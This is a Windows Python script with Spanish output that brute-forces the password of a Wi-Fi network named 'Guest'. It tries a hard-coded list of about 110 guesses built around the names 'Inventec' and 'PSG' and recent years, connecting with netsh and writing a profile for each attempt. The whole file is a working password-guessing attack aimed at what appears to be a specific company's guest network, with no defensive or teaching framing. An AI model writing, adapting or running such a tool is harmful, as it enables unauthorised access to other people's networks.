import subprocess
import time

ssid = "Guest"

passwords = [
    "PSG_Inventec@", "2025_Inventec", "PSG_Inventec", "Inventec_2025", "Guest_Inventec",
    "Inventec2025@", "PSG2025", "Inventec@2025", "PSG-Inventec", "PSGInventec2025",
    "Inventec@", "Guest2025", "InventecGuest@2025", "PSG2025@", "Inventec-WiFi",
    "WiFi_Inventec", "PSG@2025", "InventecPSG", "Inventec#2025", "Inventec2025!",
    "PSG_Inventec2025", "Inventec_25", "2025-Inventec", "2025@Inventec", "Inv3ntec2025",
    "1nventec2025", "Guest_Inventec@", "PSG2025_", "Inventec2025_", "InventecNet2025",
    "Guest@Inventec", "PSG2025-Inventec", "WiFiGuest2025", "Inventec#Guest2025",
    "2025_Guest", "Guest-2025-Inventec", "Invntc2025", "Inv@2025", "PSG2024",
    "PSG2026", "Inventec@2024", "Inventec@2026", "2024Inventec", "2026Inventec",
    "InventecAccess2025", "PSG-Access", "Guest#2025", "WiFi2025!", "AccessPoint2025",
    "Access_Inventec", "PSG_123", "PSG_2025", "PSG@Guest", "Guest@2025",
    "PSG@Inventec2025", "Inventec2025#", "2025WiFi", "WiFi2025Guest", "Guest_WiFi",
    "Guest1234", "Inventec1234", "Guest_2025", "PSGWiFi", "GuestPSG2025",
    "PSG_Guest@2025", "PSG-WiFi-Inventec", "GuestWifi#", "Inventec-PSG",
    "Invntc#", "PSG-Invtc", "InventecWifi@", "Inv2025", "2025@PSG",
    "PSG2025-WiFi", "GuestAccess2025", "PSG2025Net", "Invntc_@", "PSG_Acc3ss",
    "Acc3ss2025", "Acces2025", "Acc3ss_Inventec", "NetInventec2025", "PSG!2025",
    "Guest-Inventec@", "PSG_Inv2025", "InventecPSG@", "InvGuest2025",
    "WiFi_Acc3ss2025", "Net2025Access", "Inventec_WiFi_2025", "PSG__2025", "Access#2025",
    "GUEST_WIFI2025", "2025@GUEST", "Guest!@#2025", "PSG_@@2025", "PSG#WiFi",
    "PSG2025Guest", "AccessPoint@PSG", "Inventec#Network", "PSG_2025@Inventec", "WIFI_PSG2025",
    "INVENTECwifi2025", "WifiGuest@", "Inventec_@@2025", "PSG-Access2025", "2025-PSG-Inventec",
    "Inventec_2025_WiFi", "GUEST_1234", "PSG_INVENTEC2025", "Inventec@@2025"
]

def conectar_wifi(ssid, password):
    profile = f"""
    <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
        <name>{ssid}</name>
        <SSIDConfig>
            <SSID>
                <name>{ssid}</name>
            </SSID>
        </SSIDConfig>
        <connectionType>ESS</connectionType>
        <connectionMode>manual</connectionMode>
        <MSM>
            <security>
                <authEncryption>
                    <authentication>WPA2PSK</authentication>
                    <encryption>AES</encryption>
                    <useOneX>false</useOneX>
                </authEncryption>
                <sharedKey>
                    <keyType>passPhrase</keyType>
                    <protected>false</protected>
                    <keyMaterial>{password}</keyMaterial>
                </sharedKey>
            </security>
        </MSM>
    </WLANProfile>
    """

    with open("wifi_profile.xml", "w") as file:
        file.write(profile)

    subprocess.run(["netsh", "wlan", "add", "profile", "filename=wifi_profile.xml"], capture_output=True)
    subprocess.run(["netsh", "wlan", "connect", "name=" + ssid], capture_output=True)
    time.sleep(5)

    estado = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True)
    if ssid.lower() in estado.stdout.lower() and "conectado" in estado.stdout.lower():
        return True
    return False

for pwd in passwords:
    print(f"🔑 Probando: {pwd}")
    if conectar_wifi(ssid, pwd):
        print(f"✅ ¡Conectado! Contraseña correcta: {pwd}")
        break
    else:
        print(f"❌ Falló: {pwd}")
else:
    print("🚫 No se encontró una contraseña válida.")
